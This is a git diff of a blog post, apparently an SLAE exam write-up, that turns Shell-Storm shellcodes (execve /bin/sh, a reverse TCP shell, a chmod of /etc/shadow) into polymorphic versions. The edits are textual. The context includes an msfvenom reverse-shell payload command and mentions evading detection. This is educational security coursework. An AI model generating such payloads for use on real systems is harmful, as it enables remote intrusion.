@@ -31,13 +31,15 @@ Polymorphic encoders such as Shikata-Ga-Nai can be used in this scenario to evad
 The 3 Shell-Storm references that will be modified:
 
 * Execve <code class="language-plaintext highlighter-rouge">/bin/sh</code> 
-* Reverse TCP Bind Shell 
+* Reverse TCP Shell 
 * Chmod <code class="language-plaintext highlighter-rouge">/etc/shadow</code>  
 
 #### 1st Shellcode (Execve /bin/sh)
 --------
 
-The execve shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host, as referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-811.php] [execve-shellstorm]:
+The execve shellcode will spawn a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host. 
+
+Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-811.php] [execve-shellstorm]:
 
 ```c
 /*
@@ -209,10 +211,12 @@ $
 
 The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.
 
-#### 2nd Shellcode (linux/x86/shell_reverse_tcp)
+#### 2nd Shellcode (Reverse TCP Shell)
 --------------
 
-A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine:
+A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine.
+
+Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-849.php] [reversetcp-shellstorm]::
 
 ```bash
 osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
@@ -454,3 +458,4 @@ GitHub Repo: [Code][github-code]
 [slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
 [github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment6
 [execve-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-811.php
+[reversetcp-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-849.php
